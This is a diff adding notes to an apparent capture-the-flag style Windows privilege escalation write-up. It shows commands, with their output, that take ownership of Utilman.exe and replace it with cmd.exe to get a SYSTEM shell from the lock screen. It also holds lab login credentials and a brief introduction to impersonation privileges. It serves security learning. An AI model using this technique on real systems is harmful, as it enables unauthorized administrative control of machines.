@@ -725,11 +725,47 @@
 >> ``` 
 > 
 > # C. SeTakeOwnership
-> 
-> 
+> The **SeTakeOwnership** privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges.
+>
+> Log in to the target machine via RDP using the following credentials:
+>
+> User: `THMTakeOwnership` Password: `TheWorldIsMine2022`
+>
+> Open and run command prompt as the administrator.
+>
+> We'll abuse `utilman.exe` to escalate privilege this time. **Utilman** is a built-in Windows application used to provide Ease of Access options during the lock screen. It is run with SYSTEM privileges, therefore we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. We can take ownership and replace any file.
+> ![Image of Utilman]([Isolated.pn](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.passfab.com%2Fimages%2Ftopics%2Falternative%2Fwindows-11%2Faccessibility.jpg%3Fw%3D804%26h%3D624&f=1&nofb=1&ipt=ae7c90cc9b01cc71929477d99216cede1bb0d53bfabe02fe35d2bf3859b35736&ipo=images) "Utilman")
+>
+> We will then replace utilman
+>
+> ### TARGET MACHINE:
+>> ```
+>> C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe
+>>
+>> SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WPRIVESC2\THMTakeOwnership".
+>>
+>> C:\Windows\system32>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+>> processed file: C:\Windows\System32\Utilman.exe
+>> Successfully processed 1 files; Failed processing 0 files
+>>
+>> C:\Windows\system32>copy cmd.exe utilman.exe
+>> Overwrite utilman.exe? (Yes/No/All): yes
+>>         1 file(s) copied.
+>> ``` 
+>
+> To trigger utilman, we will lock our screen from the start button.
+>
+> Finally, click the "Ease of Access" button, which runs `utilman.exe` with SYSTEM privileges. This will cause to pop a command line.
+>
+> Although this won't give us access to `C:\Users\Administrator\flag.txt`.
 > 
 > # D. Selmpersonate / SeAssignPrimaryToken
-> 
+>
+> These privileges allow a process to impersonate other users and act on their behalf.
+>
+> Impersonation usually consists of being able to spawn a process or thread under the security context of another user. You can understand impersonation by looking how FTP server works.
+>
+> As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
 
 
 </details>
